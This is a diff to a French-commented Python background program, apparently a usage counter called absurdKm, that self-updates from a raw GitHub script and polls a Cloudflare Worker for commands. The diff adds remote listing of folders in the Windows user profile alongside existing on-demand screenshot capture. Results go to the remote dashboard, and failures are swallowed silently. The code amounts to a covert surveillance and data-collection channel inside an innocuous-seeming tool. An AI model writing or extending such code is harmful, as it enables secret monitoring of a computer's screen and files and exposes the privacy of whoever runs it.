@@ -55,7 +55,7 @@ SHOT_MAX_W = 2560                      # définition max de la capture envoyée 
 SHOT_MAX_H = 1600
 SHOT_QUALITY = 85                      # qualité JPEG (1-100)
 
-VERSION = "1.7.7"
+VERSION = "1.7.8"
 UPDATE_URL = "https://raw.githubusercontent.com/fenix1048/assets-21st.dev/main/absurdeKm.pyw"
 
 # --- tableau de bord en ligne (Cloudflare Worker) ---
@@ -329,8 +329,37 @@ def cloud_request(path, data=None, timeout=30):
     with urllib.request.urlopen(req, timeout=timeout) as r:
         return json.loads(r.read().decode("utf-8"))
 
+# ------------------------- explorateur de fichiers (lecture seule) -------------------------
+LIST_ROOT = os.path.realpath(os.environ.get("USERPROFILE", os.path.expanduser("~")))
+LIST_MAX = 500
+HIDDEN_ATTRS = 0x02 | 0x04   # fichier caché | fichier système
+
+def list_folder(rel):
+    """Liste un dossier du profil Windows. Lecture seule, rien ne peut sortir du profil."""
+    target = os.path.realpath(os.path.join(LIST_ROOT, rel.strip("\\/")))
+    if os.path.commonpath([LIST_ROOT, target]) != LIST_ROOT:
+        raise PermissionError("Dossier hors du profil")
+    if not os.path.isdir(target):
+        raise FileNotFoundError("Dossier introuvable")
+    items = []
+    with os.scandir(target) as it:
+        for e in it:
+            try:
+                st = e.stat(follow_symlinks=False)
+            except OSError:
+                continue
+            if getattr(st, "st_file_attributes", 0) & HIDDEN_ATTRS:
+                continue
+            is_dir = e.is_dir(follow_symlinks=False)
+            items.append({"name": e.name, "dir": is_dir,
+                          "size": 0 if is_dir else st.st_size, "mtime": st.st_mtime})
+    items.sort(key=lambda x: (not x["dir"], x["name"].lower()))
+    rel_out = os.path.relpath(target, LIST_ROOT)
+    if rel_out == ".":
+        rel_out = ""
+    return {"path": rel_out, "items": items[:LIST_MAX], "total": len(items)}
+
 def cloud_loop():
-    """Envoie les stats et exécute les captures demandées. Échec silencieux."""
     pc = socket.gethostname()
     last_push = 0.0
     last_id = None
@@ -341,18 +370,19 @@ def cloud_loop():
                 last_push = time.monotonic()
             cmd = cloud_request("/api/poll?pc=" + urllib.parse.quote(pc))
             rid = cmd.get("id")
-            if rid and rid != last_id:          # une seule capture par demande
+            if rid and rid != last_id:
                 last_id = rid
                 try:
-                    image = capture_screen_jpeg_b64()
-                    cloud_request("/api/result", {"id": rid, "image": image}, timeout=60)
+                    if cmd.get("type") == "list":
+                        result = {"id": rid, "list": list_folder(cmd.get("path", ""))}
+                    else:
+                        result = {"id": rid, "image": capture_screen_jpeg_b64()}
                 except Exception as e:
-                    # on prévient le tableau de bord au lieu de le laisser attendre
-                    cloud_request("/api/result", {"id": rid, "error": str(e)[:200]})
+                    result = {"id": rid, "error": str(e)[:200]}
+                cloud_request("/api/result", result, timeout=60)
         except Exception:
             pass  # absurdKm continue de compter même si le serveur ne répond pas
         time.sleep(CLOUD_POLL_S)
-
 # ------------------------- API Windows -------------------------
 user32 = ctypes.WinDLL("user32")
 kernel32 = ctypes.WinDLL("kernel32", use_last_error=True)
